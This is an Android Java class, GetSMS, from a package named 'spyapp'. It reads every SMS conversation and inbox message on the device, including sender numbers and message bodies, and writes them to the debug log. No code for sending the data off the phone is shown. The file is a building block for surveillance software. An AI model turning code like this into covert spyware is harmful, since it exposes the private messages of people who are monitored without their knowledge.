package com.example.spyapp;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

public class GetSMS {

	public GetSMS(){}

	public void getConversations(Context context){
		Uri SMS_INBOX = Uri.parse("content://sms/conversations/");
	    Cursor c = context.getContentResolver().query(SMS_INBOX, null, null, null, "date desc");

        String[] count = new String[c.getCount()];
        String[] snippet = new String[c.getCount()];
        String[] thread_id = new String[c.getCount()];

        c.moveToFirst(); 
        for (int i = 0; i < c.getCount(); i++) {
            count[i] = c.getString(c.getColumnIndexOrThrow("msg_count"))
                    .toString();
            thread_id[i] = c.getString(c.getColumnIndexOrThrow("thread_id"))
                    .toString();
            snippet[i] = c.getString(c.getColumnIndexOrThrow("snippet"))
                    .toString();
            //Toast.makeText(getApplicationContext(), count[i] + " - " + thread_id[i]+" - "+snippet[i] , Toast.LENGTH_LONG).show();
            c.moveToNext();
            
            Log.d("GetSMS", count[i]+" : #"+thread_id[i]+"   "+snippet[i]);
        }
        c.close();
        Log.d("GetSMS","---------------");
        getMessages(context, thread_id);
	}
	
	
	public void getMessages(Context context, String[] thread_id){
		for(int ad = 0; ad < thread_id.length ; ad++)
	    {
		    Uri uri = Uri.parse("content://sms/inbox");
		    String where = "thread_id="+thread_id[ad]; 
		    Cursor mycursor= context.getContentResolver().query(uri, null, where ,null,null); 
		    //startManagingCursor(mycursor);
	
		    String[] number = new String[mycursor.getCount()];
		    String[] text = new String[mycursor.getCount()];
	
		    if(mycursor.moveToFirst()){
	            for(int i=0;i<mycursor.getCount();i++){
	            	// COLONNES POSSIBLES :
	            	// [ _id, thread_id, address, person, date, protocol,
	            	//   read, status, type, reply_path_present, subject, body, service_center, locked ]
                    number[i]=mycursor.getString(mycursor.getColumnIndexOrThrow("address")).toString();
                    text[i]=mycursor.getString(mycursor.getColumnIndexOrThrow("body")).toString();
                    Log.d("GetSMS", where+" : "+number[i]+"  "+text[i]);
                    mycursor.moveToNext();
	            }
		    }
		    mycursor.close();
		}
	}
}
